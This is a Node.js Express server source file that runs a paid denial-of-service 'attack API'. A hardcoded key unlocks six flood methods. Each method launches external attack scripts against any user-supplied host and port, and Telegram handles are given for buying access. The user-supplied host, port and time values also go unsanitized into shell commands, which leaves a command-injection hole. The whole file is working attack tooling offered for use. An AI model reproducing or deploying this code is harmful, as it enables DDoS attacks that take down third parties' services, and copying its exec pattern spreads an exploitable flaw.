const express = require("express");
const app = express();
const port = 5500;
var exec = require("child_process").exec;

app.get("/api/attack", (req, res) => {
  const clientIP =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`);
  if (!key || !host || !port || !time|| !method) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=EnterYouKey&host={host}&port={port}&time={time}&method={method}`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_u);
  }

  if (key !== "tbaodz") {
    const err_key = {
      status: `error`,
      message: `Error Keys | Dms Buy Key : t.me/scrvipbytbao`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_key);
  }

  if (time > 500) {
    const err_time = {
      status: `error`,
      message: `Error Time < 500 Second`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_time);
  }
  if (port > 65535 || port < 1) {
    const err_time = {
      status: `error`,
      message: `Error Port`,
      info: `t.me/haibe206`,
    };
    return res.status(400).send(err_time);
  }

  if (
    !(
      method.toLowerCase() === "flood" ||
      method.toLowerCase() === "storm" ||
      method.toLowerCase() === "https" ||
      method.toLowerCase() === "bypass" ||
      method.toLowerCase() === "browser" ||
      method.toLowerCase() === "raw"
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      info: `t.me/cyberviet`,
    };
    return res.status(400).send(err_method);
  }

  const jsonData = {
    status: `success`,
    message: `Attack successfully sent`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
    info: `t.me/scrvipbytbao`,
  };
  res.status(200).send(jsonData);
  if (method.toLowerCase() === "storm") {
    exec(
      `node storm.js ${host} ${time} 128 32 http.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "flood") {
    exec(
      `node flood.js ${host} ${time} 32 8 socks.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "bypass") {
    exec(
      `node henry.js ${host} ${time} 128 32 http.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "https") {
    exec(
      `node raw.js ${host} ${time} 128 32 http.txt`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "browser") {
    exec(
      `node browser.js ${host} 10 100 socks.txt 90 ${time}`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [HTTPS] executed successfully`);
      },
    );
  }
  if (method.toLowerCase() === "raw") {
    exec(
      `go run udp.go ${host} ${port} ${time} payload=random size=1024`,
      (error, stdout, stderr) => {
        if (error) {
          console.error(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        if (stdout) {
          console.error(`stderr: ${stderr}`);
        }
        console.log(`[${clientIP}] Command [TLS] executed successfully`);
      },
    );
  }
});
app.listen(port, () => {
  console.log(`[API SERVER] running on http://localhost:${port}`);
});
